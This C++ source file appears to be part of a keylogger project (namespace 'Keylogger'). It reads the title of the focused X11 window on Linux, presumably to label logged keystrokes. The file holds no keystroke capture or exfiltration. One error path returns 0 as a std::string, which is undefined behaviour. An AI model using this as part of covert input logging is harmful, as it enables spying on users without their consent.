#ifdef __linux__

#include "WindowHandlerLinuxX11.h"

#include <X11/Xatom.h>
#include <X11/Xlib.h>

#include <string.h>

#define WINDOW_MAX 1024

namespace Keylogger {

Window getCurrentWindow(Display* display) {
    Window focus = 0;
    int unused;

    XGetInputFocus(display, &focus, &unused);
    return focus;
}

std::string getWindowText(Display* display, Window window) {
    char* text;

    //if the current window doesn't have a name, traverse upwards until one does
    if (!XFetchName(display, window, &text)) {
        Window w = window;
        Window root;
        Window parent;
        Window *children;
        unsigned int childcount;

        do {
            if (!XQueryTree(display, w, &root, &parent, &children, &childcount))
                return 0;

            w = parent;
            if (childcount > 0) {
                XFree(children);
            }
            if (parent == root) {
                break;
            }

            if (XFetchName(display, w, &text)) {
                break;
            }
        } while(parent != root);

        if (parent == root)
            return "";
    }

    std::string result(text);
    XFree(text);
    return result;
}

std::string WindowHandlerLinuxX11::getWindowString() {
    Display *display = XOpenDisplay(NULL);
    std::string result = getWindowText(display, getCurrentWindow(display));
    XCloseDisplay(display);
    return result;
}

}

#endif // defined(__linux__)
